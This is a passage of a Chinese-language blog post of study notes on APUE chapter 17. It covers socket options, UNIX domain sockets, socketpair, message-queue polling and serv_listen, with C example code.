class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="套接字选项"><a href="#套接字选项" class="headerlink" title="套接字选项"></a>套接字选项</h2><ul><li>通用选项</li><li>在套接字层次管理的选项，但是依赖于下层协议的支持</li><li>特定于某协议的选项，每个协议独有的</li></ul><h3 id="setsockopt"><a href="#setsockopt" class="headerlink" title="setsockopt"></a>setsockopt</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">setsockopt</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-type">int</span> level, <span class="hljs-type">int</span> option, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">socklen_t</span> len)</span>;<br><span class="hljs-comment">//返回值：若成功，返回0；若出错，返回-1</span><br></code></pre></td></tr></table></figure><ul><li><code>level</code>：标识了选项应用的协议<ul><li>​通用套接字层则为<code>SOL_SOCKET</code></li><li><code>TCP</code>为<code>IPPRTO_TCP</code></li><li><code>IP</code>为<code>IPPROTO_IP</code></li></ul></li></ul><p><img src="https://gitee.com/h0pe-ay/blogimages/raw/master/image-20230226202107691.png" alt="image-20230226202107691"></p><ul><li><code>val</code>：根据选项的不同指向一个数据结构或者一个整数。<ul><li>选项是<code>on</code>&#x2F;<code>off</code>开关。若非零则启用，零则关闭</li></ul></li><li><code>len</code>：指定<code>val</code>指向的对象的大小</li></ul><h3 id="getsockopt"><a href="#getsockopt" class="headerlink" title="getsockopt"></a>getsockopt</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">getsockopt</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-type">int</span> level, <span class="hljs-type">int</span> option, <span class="hljs-type">void</span> *<span class="hljs-keyword">restrict</span> val, <span class="hljs-type">socklen_t</span> *<span class="hljs-keyword">restrict</span> lenp)</span>;<br><span class="hljs-comment">//返回值：若成功，返回0；若出错，返回-1</span><br></code></pre></td></tr></table></figure><h3 id="sockatmark"><a href="#sockatmark" class="headerlink" title="sockatmark"></a>sockatmark</h3><p>判断是否到达紧急标志</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sockatmark</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd)</span>;<br><span class="hljs-comment">//返回值:若在标记处，返回-1；若没在标记处，返回0；若出错，返回-1</span><br></code></pre></td></tr></table></figure><h1 id="高级进程间通信"><a href="#高级进程间通信" class="headerlink" title="高级进程间通信"></a>高级进程间通信</h1><h2 id="UNIX域套接字"><a href="#UNIX域套接字" class="headerlink" title="UNIX域套接字"></a>UNIX域套接字</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">socketpair</span><span class="hljs-params">(<span class="hljs-type">int</span> domain, <span class="hljs-type">int</span> type, <span class="hljs-type">int</span> protocol, <span class="hljs-type">int</span> sockfd[<span class="hljs-number">2</span>])</span>;<br><span class="hljs-comment">//返回值：若成功，返回0：若出错，返回-1</span><br></code></pre></td></tr></table></figure><p><strong>17-2.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-type">int</span> <br><span class="hljs-title function_">fd_pipe</span><span class="hljs-params">(<span class="hljs-type">int</span> fd[<span class="hljs-number">2</span>])</span><br>&#123;<br>    <span class="hljs-keyword">return</span>(socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, fd));<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>借助UNIX域套接字轮询XSI消息队列</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NQ 3</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXMSZ 512</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEY 0x123</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">threadinfo</span> &#123;</span><br>    <span class="hljs-type">int</span> qid; <span class="hljs-comment">//线程id</span><br>    <span class="hljs-type">int</span> fd; <span class="hljs-comment">//文件描述符</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mymesg</span> &#123;</span><br>    <span class="hljs-type">long</span> mtype; <span class="hljs-comment">//类型</span><br>    <span class="hljs-type">char</span> mtext[MAXMSZ]; <span class="hljs-comment">//字符串</span><br>&#125;;<br><br><span class="hljs-type">void</span> *<br><span class="hljs-title function_">helper</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mymesg</span> <span class="hljs-title">m</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">threadinfo</span> *<span class="hljs-title">tip</span> =</span> arg;<br><br>    <span class="hljs-keyword">for</span> (;;)&#123;<br>        <span class="hljs-built_in">memset</span>(&amp;m, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(m));<br>        <span class="hljs-keyword">if</span> ((n = msgrcv(tip-&gt;qid, &amp;m, MAXMSZ, <span class="hljs-number">0</span>, MSG_NOERROR)) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//检索消息队列中的第一条消息，标志位为MSG_NOERROR时，当消息大小超过msgze时被截断。</span><br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;msgrcv error!\n&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (write(tip-&gt;fd, m.mtext, n) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//不断地从队列中取出数据，并写入线程对应的文件描述符中</span><br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;write error!\n&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> i, n, err;<br>    <span class="hljs-type">int</span> fd[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span> qid[NQ];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pfd</span>[<span class="hljs-title">NQ</span>];</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">threadinfo</span> <span class="hljs-title">ti</span>[<span class="hljs-title">NQ</span>];</span><br>    <span class="hljs-type">pthread_t</span> tid[NQ];<br>    <span class="hljs-type">char</span> buf[MAXMSZ];<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; NQ; i++)&#123;<br>        <span class="hljs-keyword">if</span> ((qid[i] = msgget((KEY+i), IPC_CREAT | <span class="hljs-number">0666</span>)) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//创建队列</span><br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;msgget error\n&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;queue ID %d is %d\n&quot;</span>, i, qid[i]);<br><br>        <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_DGRAM, <span class="hljs-number">0</span>, fd) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//全双工的UINX域套接字</span><br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;pthread_create error&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        pfd[i].fd = fd[<span class="hljs-number">0</span>];<br>        pfd[i].events = POLLIN; <span class="hljs-comment">//感兴趣的事件</span><br>        ti[i].qid = qid[i];<br>        ti[i].fd = fd[<span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">if</span> ((err = pthread_create(&amp;tid[i], <span class="hljs-literal">NULL</span>, helper, &amp;ti[i])) != <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;pthread create error!&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-keyword">if</span> (poll(pfd, NQ, <span class="hljs-number">-1</span>) &lt; <span class="hljs-number">0</span>)<span class="hljs-comment">//监听指定的事件</span><br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;poll error&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; NQ; i++) &#123;<br>            <span class="hljs-keyword">if</span> (pfd[i].revents &amp; POLLIN) &#123; <span class="hljs-comment">//判断到指定的描述符中有数据</span><br>                <span class="hljs-keyword">if</span> ((n = read(pfd[i].fd, buf, <span class="hljs-keyword">sizeof</span>(buf))) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//则从描述符中读取数据到缓存区中</span><br>                &#123;<br>                    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;read error&quot;</span>);<br>                    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>                &#125;<br>                buf[n] = <span class="hljs-number">0</span>;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;queue id %d, message %s\n&quot;</span>, qid[i], buf);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>17-4.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXMSZ 512</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mymesg</span> &#123;</span><br>    <span class="hljs-type">long</span> mtype; <span class="hljs-comment">//消息类型</span><br>    <span class="hljs-type">char</span> mtext[MAXMSZ]; <span class="hljs-comment">//消息</span><br>&#125;;<br><br><span class="hljs-type">int</span> <br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-type">key_t</span> key;<span class="hljs-comment">//关键值</span><br>    <span class="hljs-type">long</span> qid;<br>    <span class="hljs-type">size_t</span> nbytes;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mymesg</span> <span class="hljs-title">m</span>;</span><br><br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">3</span>) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span> ,<span class="hljs-string">&quot;usage: sendmsg KEY message\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    key = strtol(argv[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> ((qid = msgget(key, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;can&#x27;t open queue key %s\n&quot;</span>, argv[<span class="hljs-number">1</span>]);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">memset</span>(&amp;m, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(m));<br>    <span class="hljs-built_in">strncpy</span>(m.mtext, argv[<span class="hljs-number">2</span>], MAXMSZ<span class="hljs-number">-1</span>);<br>    nbytes = <span class="hljs-built_in">strlen</span>(m.mtext);<br>    m.mtype = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (msgsnd(qid, &amp;m, nbytes, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;can&#x27;t send message\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>17-5.c 命名UNIX域套接字</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/un.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-type">int</span> fd, size;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_un</span> <span class="hljs-title">un</span>;</span>  <br><br>    un.sun_family = AF_UNIX; <br>    <span class="hljs-built_in">strcpy</span>(un.sun_path, <span class="hljs-string">&quot;foo.socket&quot;</span>); <span class="hljs-comment">//设置绑定路径</span><br>    <span class="hljs-keyword">if</span> ((fd = socket(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//创建套接字</span><br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;socket failed&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    size = offsetof(<span class="hljs-keyword">struct</span> sockaddr_un, sun_path) + <span class="hljs-built_in">strlen</span>(un.sun_path); <span class="hljs-comment">//计算路径长度 </span><br>    <span class="hljs-keyword">if</span> (bind(fd, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;un, size) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//绑定本地路径</span><br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;bind failed&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;UNIX domain socket bound\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="唯一连接"><a href="#唯一连接" class="headerlink" title="唯一连接"></a>唯一连接</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;apue.h&quot;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">serv_listen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name)</span>;<br><span class="hljs-comment">//返回值：若成功，返回要监听的文件描述符； 若出差，返回负值</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">serv_acceptt</span><span class="hljs-params">(<span class="hljs-type">int</span> listenfd, <span class="hljs-type">uid_t</span> *uidptr)</span>;<br><span class="hljs-comment">//返回值：若成功，返回新文件描述符；若出差，返回负值</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">cli_conn</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name)</span>;<br><span class="hljs-comment">//返回值：若成功，返回文件描述符；若出错，返回负值</span><br></code></pre></td></tr></table></figure><h3 id="serv-listen"><a href="#serv-listen" class="headerlink" title="serv_listen"></a>serv_listen</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/un.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> QLEN 10</span><br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">serv_listern</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name)</span><br>&#123;<br>    <span class="hljs-type">int</span> fd, len, err, rval;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span>  <span class="hljs-title">sockaddr_un</span> <span class="hljs-title">un</span>;</span><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(name) &gt;= <span class="hljs-keyword">sizeof</span>(un.sun_path))<br>    &#123;<br>        errno = ENAMETOOLONG;<br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ((fd = socket(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">-2</span>);<br><br>    unlink(name); <span class="hljs-comment">//删除文件名为name的文件</span><br><br>    <span class="hljs-built_in">memset</span>(&amp;un, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(un));<br>    un.sun_family = AF_UNIX;<br>    <span class="hljs-built_in">strcpy</span>(un.sun_path, name);<br>    len = offsetof(<span class="hljs-keyword">struct</span>  sockaddr_un, sun_path) + <span class="hljs-built_in">strlen</span>(name);<br><br>    <span class="hljs-keyword">if</span> (bind(fd, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;un, len) &lt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">//绑定sun_path路径</span><br>        rval = <span class="hljs-number">-3</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (listen(fd, QLEN) &lt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">//开启监听</span><br>        rval = <span class="hljs-number">-4</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br>    <span class="hljs-keyword">return</span>(fd);<br><br>errout:<br>    err = errno;<br>    close(fd);<br>    errno = err;<br>    <span class="hljs-keyword">return</span>(rval);<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="serv-accept"><a href="#serv-accept" class="headerlink" title="serv_accept"></a>serv_accept</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td 